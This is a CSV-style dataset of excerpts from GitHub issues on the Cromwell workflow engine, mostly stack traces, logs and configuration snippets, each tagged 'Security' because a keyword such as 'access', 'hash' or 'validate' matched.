Security,"omwell_1 | Caused by: software.amazon.awssdk.core.exception.SdkClientException: Unable to load credentials from any of the providers in the chain AwsCredentialsProviderChain(credentialsProviders=[SystemPropertyCredentialsProvider(), EnvironmentVariableCredentialsProvider(), ProfileCredentialsProvider(profileName=default, profileFile=ProfileFile(profiles=[Profile(name=service1, properties=[aws_access_key_id, aws_secret_access_key]), Profile(name=service2, properties=[aws_access_key_id, aws_secret_access_key])])), ContainerCredentialsProvider(), InstanceProfileCredentialsProvider()]) : [SystemPropertyCredentialsProvider(): Unable to load credentials from system settings. Access key must be specified either via environment variable (AWS_ACCESS_KEY_ID) or system property (aws.accessKeyId)., EnvironmentVariableCredentialsProvider(): Unable to load credentials from system settings. Access key must be specified either via environment variable (AWS_ACCESS_KEY_ID) or system property (aws.accessKeyId)., ProfileCredentialsProvider(profileName=default, profileFile=ProfileFile(profiles=[Profile(name=service1, properties=[aws_access_key_id, aws_secret_access_key]), Profile(name=service2, properties=[aws_access_key_id, aws_secret_access_key])])): Profile file contained no credentials for profile 'default': ProfileFile(profiles=[Profile(name=service1, properties=[aws_access_key_id, aws_secret_access_key]), Profile(name=service2, properties=[aws_access_key_id, aws_secret_access_key])]), ContainerCredentialsProvider(): Cannot fetch credentials from container - neither AWS_CONTAINER_CREDENTIALS_FULL_URI or AWS_CONTAINER_CREDENTIALS_RELATIVE_URI environment variables are set., InstanceProfileCredentialsProvider(): Unable to load credentials from service endpoint.]; cromwell_1 | 	at software.amazon.awssdk.core.exception.SdkClientException$BuilderImpl.build(SdkClientException.java:97); cromwell_1 | 	at software.amazon.awssdk.auth.credentials.AwsCredentialsProviderChain.resolveCredentials(",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5452:2088,access,accessKeyId,2088,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5452,1,['access'],['accessKeyId']
Security,on during creation; at akka.actor.ActorInitializationException$.apply(Actor.scala:174); at akka.actor.ActorCell.create(ActorCell.scala:607); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:461); at akka.actor.ActorCell.systemInvoke(ActorCell.scala:483); at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:282); at akka.dispatch.Mailbox.run(Mailbox.scala:223); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Google credentials are invalid: Connection reset; at cromwell.filesystems.gcs.GoogleAuthMode$class.validateCredentials(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.ApplicationDefaultMode.validateCredentials(GoogleAuthMode.scala:137); at cromwell.filesystems.gcs.GoogleAuthMode$class.credential(GoogleAuthMode.scala:63); at cromwell.filesystems.gcs.ApplicationDefaultMode.credential(GoogleAuthMode.scala:137); at cromwell.filesystems.gcs.GoogleAuthMode$class.buildStorage(GoogleAuthMode.scala:94); at cromwell.filesystems.gcs.ApplicationDefaultMode.buildStorage(GoogleAuthMode.scala:137); at cromwell.backend.impl.jes.JesWorkflowPaths.<init>(JesWorkflowPaths.scala:30); at cromwell.backend.impl.jes.JesCallPaths.<init>(JesCallPaths.scala:16); at cromwell.backend.impl.jes.JesCallPaths$.apply(JesCallPaths.scala:11); at cromwell.backend.impl.jes.JesWorkflowPaths.toJesCallPaths(JesWorkflowPaths.scala:42); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.jesCallPaths$lzycompute(JesAsyncBackendJobExecutionActor.scala:108); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.jesCallPaths(JesAsyncBackendJobExecutionActor.scala:108); at cromwell.backend.impl.jes.JesAsyncBackendJobExe,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1436#issuecomment-247787719:1582,validat,validateCredentials,1582,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1436#issuecomment-247787719,1,['validat'],['validateCredentials']
Security,"on the local backend with the mySQL database. It's taking Cromwell 10 minutes to process call caching. Relevant portion of the run log:. ```; [2023-03-29 12:24:32,94] [info] BT-322 b303ae23:expanse_figures.CBL_hom_not_SNP_assoc:-1:1 is eligible for call caching with read = true and write = true; [2023-03-29 12:24:32,94] [info] BT-322 b303ae23:expanse_figures.CBL_assoc:-1:1 is eligible for call caching with read = true and write = true; [2023-03-29 12:24:32,97] [info] BT-322 b303ae23:expanse_figures.CBL_hom_SNP_assoc:-1:1 is eligible for call caching with read = true and write = true; [2023-03-29 12:35:42,07] [warn] b303ae23-e1e5-4cde-832b-70114e9efdad-BackendCacheHitCopyingActor-b303ae23:expanse_figures.CBL_hom_SNP_assoc:-1:1-20000000023 [b303ae23expanse_figures.CBL_hom_SNP_assoc:NA:1]: Unrecognized runtime attribute keys: shortTask, dx_timeout; [2023-03-29 12:35:42,07] [info] BT-322 b303ae23:expanse_figures.CBL_hom_SNP_assoc:-1:1 cache hit copying success with aggregated hashes: initial = B4BFDDD19BC42B30ED73AB035F6BF1DE, file = 93DAD89F707FA490E2A46FFAC924DFFF.; [2023-03-29 12:35:42,07] [info] b303ae23-e1e5-4cde-832b-70114e9efdad-EngineJobExecutionActor-expanse_figures.CBL_hom_SNP_assoc:NA:1 [b303ae23]: Call cache hit process had 0 total hit failures before completing successfully; [2023-03-29 12:35:42,08] [warn] b303ae23-e1e5-4cde-832b-70114e9efdad-BackendCacheHitCopyingActor-b303ae23:expanse_figures.CBL_hom_not_SNP_assoc:-1:1-20000000024 [b303ae23expanse_figures.CBL_hom_not_SNP_assoc:NA:1]: Unrecognized runtime attribute keys: shortTask, dx_timeout; [2023-03-29 12:35:42,08] [info] BT-322 b303ae23:expanse_figures.CBL_hom_not_SNP_assoc:-1:1 cache hit copying success with aggregated hashes: initial = B4BFDDD19BC42B30ED73AB035F6BF1DE, file = EA2DED52B795D0B2EA5091B00E8F7A88.; [2023-03-29 12:35:42,08] [info] b303ae23-e1e5-4cde-832b-70114e9efdad-EngineJobExecutionActor-expanse_figures.CBL_hom_not_SNP_assoc:NA:1 [b303ae23]: Call cache hit process had 0 total hit failure",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108:999,hash,hashes,999,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108,1,['hash'],['hashes']
Security,on$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$start$3(Eval.scala:275); 	at cats.Eval$.loop$1(Eval.scala:336); 	at cats.Eval$.cats$Eval$$evaluate(Eval.scala:368); 	at cats.Eval$Defer.value(Eval.scala:257); 	at cats.instances.ListInstances$$anon$1.traverse(list.scala:73); 	at cats.instances.ListInstances$$anon$1.traverse(list.scala:12); 	at cats.Traverse$Ops.traverse(Traverse.scala:19); 	at cats.Traverse$Ops.traverse$(Traverse.scala:19); 	at cats.Traverse$ToTraverseOps$$anon$3.traverse(Traverse.scala:19); 	at cromwell.core.path.PathBuilderFactory$.instantiatePathBuilders(PathBuilderFactory.scala:23); 	at cromwell.engine.EngineFilesystems$.pathBuildersForWorkflow(EngineFilesystems.scala:29); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$workflowOptionsAndPathBuilders$1(MaterializeWorkflowDescriptorActor.scala:226); 	at cats.data.Validated.map(Validated.scala:204); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$materialization$MaterializeWorkflowDescriptorActor$$workflowOptionsAndPathBuilders(MaterializeWorkflowDescriptorActor.scala:225); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.applyOrElse(MaterializeWorkflowDescriptorActor.scala:159); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.applyOrElse(MaterializeWorkflowDescriptorActor.scala:155); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); 	at akka.actor.FSM.processEvent(FSM.scala:684); 	at akka.actor.FSM.processEvent$(FSM.scala:681); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.akka$actor$LoggingFSM$$super$processEvent(MaterializeWorkflowDescriptorActor.scala:136); 	at akka.actor.LoggingFSM.processEvent(FSM.scal,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:3504,Validat,Validated,3504,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,2,['Validat'],['Validated']
Security,"on-default""; scheme = ""application_default""; }; ]; }; engine {; filesystems {; gcs {; auth = ""application-default""; project = ""xxxxx""; }; }; }; backend {; default = PAPIv2; providers {; PAPIv2 {; actor-factory = ""cromwell.backend.google.pipelines.v2alpha1.PipelinesApiLifecycleActorFactory""; config {; project = ""xxxxx""; root = ""gs://xxxx/cromwell_execution""; virtual-private-cloud {; network-label-key = ""xxx""; subnetwork-label-key = ""xxx""; auth = ""application-default""; }; name-for-call-caching-purposes: PAPI; slow-job-warning-time: ""24 hours""; genomics-api-queries-per-100-seconds = 1000; maximum-polling-interval = 600; request-workers = 3; genomics {; auth = ""application-default""; endpoint-url = ""https://genomics.googleapis.com/""; location = ""us-west1""; restrict-metadata-access = false; localization-attempts = 3; parallel-composite-upload-threshold=""150M""; }; filesystems {; gcs {; auth = ""application-default""; project = ""xxxx""; caching {; duplication-strategy = ""copy""; }; }; http { }; }; default-runtime-attributes {; cpu: 1; failOnStderr: false; continueOnReturnCode: 0; memory: ""2048 MB""; bootDiskSizeGb: 10; disks: ""local-disk 10 SSD""; noAddress: false; preemptible: 0; zones: [""us-west1-a"", ""us-west1-b""]; }; include ""papi_v2_reference_image_manifest.conf""; }; }; }; }; ```; When I run with the above config using:; ```; java -Dconfig.file=genomics.conf -jar cromwell-66.jar run cumulus.wdl -i cumulus_inputs.json; ```; I am getting the following error message:; ```; [2021-08-24 22:05:33,60] [info] WorkflowManagerActor: Workflow 6cc303b4-295d-49fa-a996-b5cf7ec9beea failed (during ExecutingWorkflowState): java.lang.Exception: Task cumulus.cluster:NA:1 failed. The job was stopped before the command finished. PAPI error code 3. Execution failed: allocating: creating instance: inserting instance: Invalid value for field 'resource.networkInterfaces[0].network': ''. The referenced network resource cannot be found.; ```; I have tried passing the vpc and subnet id using the follow",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6477:1075,access,access,1075,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6477,1,['access'],['access']
Security,on.java:1536); 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); 	at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); 	at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); 	at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); 	at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:94); 	at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:981); 	at com.google.cloud.storage.spi.DefaultStorageRpc.write(DefaultStorageRpc.java:564); 	... 24 more; Caused by: javax.net.ssl.SSLException: java.net.SocketException: Broken pipe; 	at sun.security.ssl.Alerts.getSSLException(Alerts.java:208); 	at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1949); 	at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1906); 	at sun.security.ssl.SSLSocketImpl.handleException(SSLSocketImpl.java:1870); 	at sun.security.ssl.SSLSocketImpl.handleException(SSLSocketImpl.java:1815); 	at sun.security.ssl.AppOutputStream.write(AppOutputStream.java:128); 	at java.io.BufferedOutputStream.flushBuffer(BufferedOutputStream.java:82); 	at java.io.BufferedOutputStream.flush(BufferedOutputStream.java:140); 	at java.io.PrintStream.flush(PrintStream.java:338); 	at java.io.FilterOutputStream.flush(FilterOutputStream.java:140); 	at com.google.api.client.http.AbstractInputStreamContent.writeTo(AbstractInputStreamContent.java:73); 	at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:79); 	... 26 more; Caused by: java.net.SocketException: Broken pipe; 	at java.net.SocketOutputStream.socketWrite0(Native Method); 	at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109); 	at java.net.SocketOutputStream.write(SocketOutputStream.java:153); 	at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431); 	at sun.security.ssl.OutputRecord.write(OutputRecord.java:417); 	at sun.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2183:5694,secur,security,5694,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2183,1,['secur'],['security']
Security,oo.wdl.:; File not found /tmp/640585481854205084.zip4511378926145376874/bar/foo.wdl; 	at wdl4s.WdlNamespace$.wdl4s$WdlNamespace$$tryResolve$1(WdlNamespace.scala:198); 	at wdl4s.WdlNamespace$$anonfun$17.apply(WdlNamespace.scala:208); 	at wdl4s.WdlNamespace$$anonfun$17.apply(WdlNamespace.scala:207); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.immutable.List.foreach(List.scala:381); 	at scala.collection.TraversableLike$class.map(TraversableLike.scala:234); 	at scala.collection.immutable.List.map(List.scala:285); 	at wdl4s.WdlNamespace$.apply(WdlNamespace.scala:207); 	at wdl4s.WdlNamespace$.wdl4s$WdlNamespace$$load(WdlNamespace.scala:177); 	at wdl4s.WdlNamespace$.loadUsingSource(WdlNamespace.scala:173); 	at wdl4s.WdlNamespaceWithWorkflow$.load(WdlNamespace.scala:542); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$validateNamespaceWithImports$1.apply(MaterializeWorkflowDescriptorActor.scala:363); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$validateNamespaceWithImports$1.apply(MaterializeWorkflowDescriptorActor.scala:356); 	at lenthall.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:17); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.validateNamespaceWithImports(MaterializeWorkflowDescriptorActor.scala:356); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.validateNamespace(MaterializeWorkflowDescriptorActor.scala:372); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDescriptorActor.scala:172); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$3.applyOrElse(MaterializeWorkflowDescriptorActor.scala:132); 	,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1958:1928,validat,validateNamespaceWithImports,1928,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1958,1,['validat'],['validateNamespaceWithImports']
Security,"oogleJsonClientRequest.java:113); 	at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:555); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:475); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:592); 	at com.google.cloud.storage.spi.v1.HttpStorageRpc.create(HttpStorageRpc.java:305); 	... 22 common frames omitted; [2020-07-27 18:34:01,11] [info] WorkflowManagerActor Workflow 3d2d7a27-7c37-42c7-8c96-de7efef896e3 failed (during ExecutingWorkflowState): cromwell.engine.io.IoAttempts$EnhancedCromwellIoException: [Attempted 1 time(s)] - StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; Caused by: com.google.cloud.storage.StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; 	at com.google.cloud.storage.spi.v1.HttpStorageRpc.translate(HttpStorageRpc.java:227); 	at com.google.cloud.storage.spi.v1.HttpStorageRpc.create(HttpStorageRpc.java:308); 	at com.google.cloud.storage.StorageImpl$3.call(StorageImpl.java:213); 	at com.google.cloud.storage.StorageImpl$3.call(StorageImpl.java:210); 	at com.google.api.gax.retrying.DirectRetryingExecutor.submit(DirectRetryingExecutor.java:105); 	at com.google.cloud.RetryHelper.run(RetryHelper.java:76); 	at com.google.cloud.RetryHelper.runWithRetries(RetryHelper.java:50); 	at com.google.cloud.storage.StorageImpl.internalCreate(StorageImpl.java:209); 	at com.google.cloud.storage.StorageImpl.create(StorageImpl.java:171); 	at cromwell.filesystems.gcs.GcsPath.request$1(GcsPathBuilder.scala:196); 	at cromwell.filesystems.gcs.GcsPath.$anonfun$writeCon",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594:4889,access,access,4889,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594,1,['access'],['access']
Security,or ActorSystem[cromwell-system]. **java.lang.OutOfMemoryError: Java heap space**; at java.util.Arrays.copyOfRange(Arrays.java:3664); at java.lang.String.<init>(String.java:207); at java.lang.StringBuilder.toString(StringBuilder.java:407); at scala.StringContext.standardInterpolator(StringContext.scala:128); at scala.StringContext.s(StringContext.scala:95); at cromwell.engine.workflow.WorkflowActor$$anonfun$34.apply(WorkflowActor.scala:885); at cromwell.engine.workflow.WorkflowActor$$anonfun$34.apply(WorkflowActor.scala:881); at scala.collection.TraversableOnce$$anonfun$foldLeft$1.apply(TraversableOnce.scala:155); at scala.collection.TraversableOnce$$anonfun$foldLeft$1.apply(TraversableOnce.scala:155); at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221); at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428); at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428); at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428); at scala.collection.TraversableOnce$class.foldLeft(TraversableOnce.scala:155); at scala.collection.AbstractTraversable.foldLeft(Traversable.scala:104); at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$startRunnableCalls(WorkflowActor.scala:881); at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:532); at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:467); at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); at akka.actor.FSM$class.processEvent(FSM.scala:604); at cromwell.engine.workflow.WorkflowActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowActor.scala:236); at akka.actor.LoggingFSM$class.processEvent(FSM.scala:734); at cromwell.engine.workflow.WorkflowActor.processEvent(WorkflowActor.scala:236); at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.scala:598); at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:592); a,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/695:10874,Hash,HashMap,10874,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/695,1,['Hash'],['HashMap']
Security,"or.aroundReceive$(Actor.scala:512); 	at akka.event.slf4j.Slf4jLogger.aroundReceive(Slf4jLogger.scala:54); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); 	at akka.actor.ActorCell.invoke(ActorCell.scala:496); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 2018-06-13 14:29:47,368 cromwell-system-akka.dispatchers.engine-dispatcher-5 INFO - WorkflowExecutionActor-a67833cb-b894-4790-872f-9f3104cab60c [UUID(a67833cb)]: Starting demux_only.illumina_demux; 2018-06-13 14:29:48,004 cromwell-system-akka.dispatchers.engine-dispatcher-32 ERROR - Failed to hash /Volumes/nextseq_ngs/180405_NB501680_0019_AHKGNJBGX5.tar.lz4; cromwell.core.path.PathParsingException: java.lang.IllegalArgumentException: /Volumes/nextseq_ngs/180405_NB501680_0019_AHKGNJBGX5.tar.lz4 exists on a filesystem not supported by this instance of Cromwell. Supported filesystems are: s3. Please refer to the documentation for more information on how to configure filesystems: http://cromwell.readthedocs.io/en/develop/backends/HPC/#filesystems; 	at cromwell.core.path.PathFactory$.$anonfun$buildPath$4(PathFactory.scala:47); 	at scala.Option.getOrElse(Option.scala:121); 	at cromwell.core.path.PathFactory$.buildPath(PathFactory.scala:42); 	at cromwell.core.path.PathFactory.buildPath(PathFactory.scala:29); 	at cromwell.core.path.PathFactory.buildPath$(PathFactory.scala:29); 	at cromwell.backend.impl.aws.AwsBatchWorkflowPaths.buildPath(AwsBatchWorkflowPaths.scala:51); 	at cromwell.backend.io.WorkflowPaths.$anonfun$getPath$1(WorkflowPaths.scala:43); 	at scala.util.Try$.apply(Try.scala:209);",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3774:5032,hash,hash,5032,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3774,1,['hash'],['hash']
Security,"or.scala:54); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:614); 	at akka.actor.ActorCell.invoke(ActorCell.scala:583); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); 	at akka.dispatch.Mailbox.run(Mailbox.scala:229); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2023-11-07 14:51:17,39] [info] Message [cromwell.engine.workflow.lifecycle.EngineLifecycleActorAbortCommand$] from Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-4e522458-e360-45e8-be15-2fc99652d692#-686070856] to Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-4e522458-e360-45e8-be15-2fc99652d692/WorkflowExecutionActor-4e522458-e360-45e8-be15-2fc99652d692#-1420206102] was not delivered. [1] dead letters encountered, no more dead letters will be logged. If this is not an expected behavior, then [Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-4e522458-e360-45e8-be15-2fc99652d692/WorkflowExecutionActor-4e522458-e360-45e8-be15-2fc99652d692#-1420206102]] may have terminated unexpectedly, This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; ```; In fact, the program becomes unresponsive to even a Ctrl+C kill command and I have to close the terminal entirely to stop it. . The WDL passes `womtool validate` (version 84) and was run using Cromwell version 84. . When run in Terra, the workflow just immediate goes into an aborting state without any helpful error message. It would be great to incorporate this type of support for `None` inside struct fields.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7249:6997,validat,validate,6997,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7249,1,['validat'],['validate']
Security,orCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Class cromwell.services.womtool.impl.WomtoolServiceInCromwellActor for service Womtool cannot be found in the class path.; 	at cromwell.services.ServiceRegistryActor$.serviceProps(ServiceRegistryActor.scala:54); 	at cromwell.services.ServiceRegistryActor$.$anonfun$serviceNameToPropsMap$2(ServiceRegistryActor.scala:37); 	at scala.collection.TraversableLike.$anonfun$map$1(TraversableLike.scala:234); 	at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:231); 	at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:462); 	at scala.collection.TraversableLike.map(TraversableLike.scala:234); 	at scala.collection.TraversableLike.map$(TraversableLike.scala:227); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:36); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCell.newActor(ActorCell.scala:624); 	at akka.actor.ActorCell.create(ActorCell.scala:650); 	... 9 common frames omitted; Caused by: java.lang.ClassNotFoundException: cromwell.servi,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:4006,Hash,HashMap,4006,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,1,['Hash'],['HashMap']
Security,"orStrategy.handleFailure(FaultHandling.scala:296); at akka.actor.dungeon.FaultHandling$class.handleFailure(FaultHandling.scala:263); at akka.actor.ActorCell.handleFailure(ActorCell.scala:374); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:459); at akka.actor.ActorCell.systemInvoke(ActorCell.scala:483); at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:282); at akka.dispatch.Mailbox.run(Mailbox.scala:223); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Google credentials are invalid: 500 Internal Server Error; {; ""error"" : ""internal_failure""; }; at cromwell.filesystems.gcs.auth.GoogleAuthMode$class.validate(GoogleAuthMode.scala:66); at cromwell.filesystems.gcs.auth.GoogleAuthMode$class.validateCredential(GoogleAuthMode.scala:62); at cromwell.filesystems.gcs.auth.RefreshTokenMode.validateCredential(GoogleAuthMode.scala:127); at cromwell.filesystems.gcs.auth.RefreshTokenMode.credential(GoogleAuthMode.scala:147); at cromwell.filesystems.gcs.GcsPathBuilder.<init>(GcsPathBuilder.scala:57); at cromwell.filesystems.gcs.GcsPathBuilderFactory.withOptions(GcsPathBuilderFactory.scala:37); at cromwell.backend.impl.jes.JesWorkflowPaths.<init>(JesWorkflowPaths.scala:25); at cromwell.backend.impl.jes.JesWorkflowPaths.copy(JesWorkflowPaths.scala:19); at cromwell.backend.impl.jes.JesWorkflowPaths.withDescriptor(JesWorkflowPaths.scala:54); at cromwell.backend.io.WorkflowPaths$class.toJobPaths(WorkflowPaths.scala:51); at cromwell.backend.impl.jes.JesWorkflowPaths.toJobPaths(JesWorkflowPaths.scala:19); at cromwell.backend.io.WorkflowPaths$class.toJobPaths(WorkflowPaths.scala:36); at cromwell.backend.impl.jes.Je",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2270:1948,validat,validate,1948,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2270,1,['validat'],['validate']
